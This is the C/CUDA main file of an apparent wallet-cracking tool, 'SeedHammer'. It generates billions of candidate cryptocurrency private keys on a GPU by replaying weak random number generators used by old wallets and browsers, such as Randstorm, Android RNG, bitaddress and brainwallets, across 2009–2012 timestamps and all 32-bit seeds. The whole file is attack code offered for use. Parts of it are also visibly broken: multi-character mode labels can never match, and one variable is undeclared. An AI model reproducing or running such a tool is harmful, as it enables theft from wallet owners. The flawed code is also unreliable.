// SeedHammer main.cu — Auto-pipeline orchestrator
// Compile: make (uses hypothesis_gpu.cu for all mode functions)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <cuda_runtime.h>

// Hypotheses generator functions
#include "hypothesis_gpu.cu"

static const char *MODES[] = {
    "H","M","R","C","J","W","B","A","D","E",
    "L","S","T","F","G","Q","Y","M2","R2","CQ",
    "LC","RS","Z","K","X","P"
};
#define NUM_MODES (sizeof(MODES)/sizeof(MODES[0]))
#define KEYS_PER_BATCH (1024ULL * 1024 * 8) // 8M keys per batch
#define CHECKPOINT_FILE "autocycle_checkpoint.txt"
#define STOP_FLAG_FILE "STOP"
#define THREADS 1024
#define BLOCKS 8192
#define KEYS_PER_KERNEL ((uint64_t)THREADS * (uint64_t)BLOCKS)

int check_stop_signal(void){
    FILE *f = fopen(STOP_FLAG_FILE, "r");
    if(f){ fclose(f); return 1; }
    return 0;
}

void save_checkpoint(int mode_idx, uint64_t offset){
    FILE *f = fopen(CHECKPOINT_FILE, "w");
    if(!f) return;
    fprintf(f, "%s %lu\n", MODES[mode_idx], (unsigned long)offset);
    fclose(f);
}

int load_checkpoint(char *mode_str, uint64_t *offset){
    FILE *f = fopen(CHECKPOINT_FILE, "r");
    if(!f) return 0;
    int r = fscanf(f, "%s %lu", mode_str, (unsigned long *)offset);
    fclose(f);
    return r == 2;
}

// GPU kernel: generate keys for one mode
__global__ void gen_keys_kernel(char mode_char,
    uint64_t base_ts, uint32_t base_seed,
    uint64_t seed_range,
    uint8_t *d_out, uint64_t batch_keys)
{
    uint64_t idx = blockIdx.x * blockDim.x + threadIdx.x;
    if(idx >= batch_keys) return;

    uint64_t t = base_ts + (idx / (uint64_t)seed_range);
    uint32_t s = base_seed + (uint32_t)(idx % seed_range);
    uint8_t priv[32];

    switch(mode_char){
        case 'H':{
            uint64_t variant = idx % 8;
            if(variant == 0) mode_h36(t, priv);
            else if(variant == 1) mode_h36_drift(t, idx & 0xFF, priv);
            else if(variant == 2) mode_h36_le(t, priv);
            else if(variant == 3) mode_h36_sec((uint32_t)t, priv);
            else if(variant == 4) mode_h36_pid(t, (uint32_t)(s ^ t), priv);
            else if(variant == 5) mode_multisource(t, (uint32_t)s, t & 0xFFFFFFFF, 0, priv);
            else if(variant == 6) mode_jitter(t, (uint8_t)(s & 0xFF), priv);
            else mode_h36_usec(t, s, priv);
            break;
        }
        case 'M':{
            uint64_t variant = idx % 4;
            if(variant == 0) mode_mwc_v8(t, s, priv);
            else if(variant == 1) mode_mwc_little(t, s, priv);
            else if(variant == 2) mode_v8_3_0(t, s, priv);
            else mode_v8_3_4(t, s, priv);
            break;
        }
        case 'R':
            if(idx % 2 == 0) mode_randstorm(t, idx, priv);
            else mode_randstorm_little(t, idx, priv);
            break;
        case 'C':
            mode_bitcoincore_v3(t, (uint32_t)idx, (uint8_t)(idx & 0xFF), priv);
            break;
        case 'J':
            mode_android_rng(s, priv);
            break;
        case 'W':
            mode_instawallet(t, s, priv);
            break;
        case 'B':{
            const uint8_t user[] = "user_test";
            const uint8_t pass[] = "pass_test";
            mode_mybitcoin(user, pass, priv);
            break;
        }
        case 'A':
            mode_bitaddress(t, s, priv);
            break;
        case 'D':
            mode_core_v3_stack(t, (uint32_t)idx, (int)(idx % 256), priv);
            break;
        case 'E':
            mode_mywallet(t, s, priv);
            break;
        case 'L':
            mode_bitbills(t, priv);
            break;
        case 'S':
            mode_electrum(t, s, priv);
            break;
        case 'T':
            mode_h36_pid(t, (uint32_t)(t ^ idx), priv);
            break;
        case 'G':
            mode_spidermonkey(t, (uint32_t)idx, priv);
            break;
        case 'Q':
            mode_jsc_webkit(t, s, priv);
            break;
        case 'Y':
            mode_linux_libc_rand(s, priv);
            break;
        case 'M2':
            mode_mwc_v8(t, s ^ 0xCAFE4242, priv);
            break;
        case 'R2':
            mode_randstorm(t, idx ^ 0xDEADBEEF, priv);
            break;
        case 'CQ':{
            uint32_t year = 2008 + (idx % 20);
            uint32_t qq = (s & 0xFFFFFFF);
            mode_cn_brainwallet((uint32_t)(t % 16), year, qq, priv);
            break;
        }
        case 'LC':
            mode_linux_libc_rand((uint32_t)(t & 0x7FFFFFFF), priv);
            break;
        case 'RS':{
            uint8_t r[32];
            mode_short_r_brute(r, priv);
            break;
        }
        case 'Z': case 'K': case 'X': case 'P':
            // Reserved - fall through to default
        default:
            mode_h36(t, priv);
            break;
    }

    // Write 32 bytes to output
    for(int b = 0; b < 32; b++){
        d_out[idx * 32 + b] = priv[b];
    }
}

void run_mode(char mode_char,
    uint64_t ts_start, uint64_t ts_end,
    uint32_t seed_start, uint32_t seed_end,
    const char *output_path, int show_progress)
{
    uint64_t seed_range = (uint64_t)(seed_end - seed_start) + 1;
    uint64_t ts_range = ts_end - ts_start + 1;
    uint64_t total_keys = ts_range * (uint64_t)seed_range;
    uint64_t processed = 0;
    if(run_start_time == 0) run_start_time = time(NULL);
    int gpu_id = 0;
    cudaSetDevice(gpu_id);
    cudaDeviceProp prop;
    cudaGetDeviceProperties(&prop, gpu_id);
    printf("GPU: %s, total keys: %llu (ts_range=%llu, seed_range=%llu)\n",
           prop.name, (unsigned long long)total_keys,
           (unsigned long long)ts_range, (unsigned long long)seed_range);

    // Allocate device buffer
    size_t buf_size = (size_t)KEYS_PER_BATCH * 32;
    uint8_t *d_priv = NULL;
    cudaError_t err = cudaMalloc(&d_priv, buf_size);
    if(err != cudaSuccess){
        printf("cudaMalloc(%zu bytes) failed: %s\n", buf_size, cudaGetErrorString(err));
        // Fallback: smaller buffer
        buf_size = KEYS_PER_KERNEL * 32;
        err = cudaMalloc(&d_priv, buf_size);
        if(err != cudaSuccess){
            printf("Even small alloc failed: %s\n", cudaGetErrorString(err));
            return;
        }
    }
    uint8_t *h_priv = (uint8_t*)malloc(buf_size);
    if(!h_priv){ printf("host malloc failed\n"); cudaFree(d_priv); return; }

    while(processed < total_keys){
        // Inner loop: launch kernels until all keys in this batch are done
        uint64_t left = total_keys - processed;
        uint64_t sub_batch = left < KEYS_PER_KERNEL ? left : KEYS_PER_KERNEL;

        uint64_t base_ts = ts_start + (processed / seed_range);
        uint32_t base_seed = seed_start + (uint32_t)(processed % seed_range);

        // Launch GPU kernel
        unsigned int blocks = (unsigned int)((sub_batch + THREADS - 1) / THREADS);
        if(blocks > 65535u) blocks = 65535u;

        gen_keys_kernel<<<blocks, THREADS>>>(
            mode_char, base_ts, base_seed, seed_range, d_priv, sub_batch);

        cudaDeviceSynchronize();

        // Write sub_batch to file
        cudaMemcpy(h_priv, d_priv, sub_batch * 32, cudaMemcpyDeviceToHost);
        FILE *f = fopen(output_path, "ab");
        if(!f) f = fopen(output_path, "wb");
        if(f){ fwrite(h_priv, 1, sub_batch * 32, f); fclose(f); }

        processed += sub_batch;

        if(show_progress || (processed & 0xFFFFFFF) == 0){
            double pct = 100.0 * (double)processed / (double)total_keys;
            uint64_t sec_elapsed = time(NULL) - run_start_time;
            double keys_per_sec = sec_elapsed > 0 ? (double)processed / sec_elapsed : 0;
            fprintf(stderr, "\r%c: %.2f%% | %llu/%llu keys | %.2f Mkeys/s",
                mode_char, pct,
                (unsigned long long)processed, (unsigned long long)total_keys,
                keys_per_sec / 1e6);
            fflush(stderr);
        }

        if(check_stop_signal()){
            printf("\nSTOP signal received.\n");
            break;
        }
    }

    printf("\nMode %c complete: %llu keys -> %s\n",
           mode_char, (unsigned long long)processed, output_path);

    cudaFree(d_priv);
    free(h_priv);
}

void run_autocycle(void){
    printf("SeedHammer auto-cycle: %zu modes over full 2009-2012 range\n",
           NUM_MODES);
    printf("Each mode runs L1-L4 via the kernel variant logic.\n");
    printf("Expected keys per mode: %llu (4 years * seeds)\n",
           (unsigned long long)((uint64_t)0x100000000ULL * 1461ULL));

    int start_mode = 0;
    uint64_t dummy_offset = 0;
    char saved_mode[8] = {0};

    if(load_checkpoint(saved_mode, &dummy_offset)){
        for(size_t i = 0; i < NUM_MODES; i++){
            if(strcmp(saved_mode, MODES[i]) == 0){
                start_mode = (int)i;
                printf("Resuming from mode %s\n", MODES[i]);
                break;
            }
        }
    }

    uint64_t ts_start = 1230768000; // Jan 1, 2009
    uint64_t ts_end   = 1356998400; // Dec 31, 2012

    for(int m = start_mode; m < (int)NUM_MODES; m++){
        if(check_stop_signal()){
            printf("\nSTOP signal received. Halting.\n");
            return;
        }

        printf("\n[%d/%zu] Mode %s (ts=%llu..%llu, seeds=0..0xFFFFFFFF)...\n",
               m+1, NUM_MODES, MODES[m],
               (unsigned long long)ts_start, (unsigned long long)ts_end);
        fflush(stdout);

        char output_path[64];
        snprintf(output_path, sizeof(output_path), "keys_%s.bin", MODES[m]);

        run_mode(MODES[m][0],
                 ts_start, ts_end,
                 0, 0xFFFFFFFF,
                 output_path, 0);

        save_checkpoint(m, 0);
    }

    printf("\n=== All %zu modes complete ===\n", NUM_MODES);
    printf("Total keys generated: ~%llu\n",
           (unsigned long long)(NUM_MODES * ((uint64_t)0x100000000ULL * 1461ULL)));
}

int main(int argc, char *argv[]){
    if(argc > 1 && (strcmp(argv[1],"AUTO")==0 || strcmp(argv[1],"ALL")==0)){
        run_autocycle();
        return 0;
    }

    if(argc < 2){
        fprintf(stderr, "Usage: %s <mode> [options]\n", argv[0]);
        fprintf(stderr, "Modes: H M R C J W B A D E L S T F G Q Y M2 R2 CQ LC RS Z K X P\n");
        fprintf(stderr, "       ALL or AUTO = autonomous cycle through all modes\n");
        return 1;
    }

    char mode_char = argv[1][0];
    uint64_t ts_start = 1288834970;
    uint64_t ts_end   = 1356998400;
    uint32_t seed_start = 0;
    uint32_t seed_end   = 0xFFFFFFFF;
    const char *output_path = "keys.bin";
    int show_progress = 0;

    for(int i = 2; i < argc; i++){
        if(!strcmp(argv[i],"--ts-start") && i+1 < argc) ts_start = strtoull(argv[++i],NULL,10);
        else if(!strcmp(argv[i],"--ts-end") && i+1 < argc) ts_end = strtoull(argv[++i],NULL,10);
        else if(!strcmp(argv[i],"--seed-start") && i+1 < argc) seed_start = (uint32_t)strtoul(argv[++i],NULL,10);
        else if(!strcmp(argv[i],"--seed-end") && i+1 < argc) seed_end = (uint32_t)strtoul(argv[++i],NULL,10);
        else if(!strcmp(argv[i],"--output") && i+1 < argc) output_path = argv[++i];
        else if(!strcmp(argv[i],"--progress")) show_progress = 1;
    }

    printf("SeedHammer mode %c: ts=%lu..%lu seed=%u..%u -> %s\n",
           mode_char, ts_start, ts_end, seed_start, seed_end, output_path);

    run_mode(mode_char, ts_start, ts_end, seed_start, seed_end, output_path, show_progress);
    return 0;
}
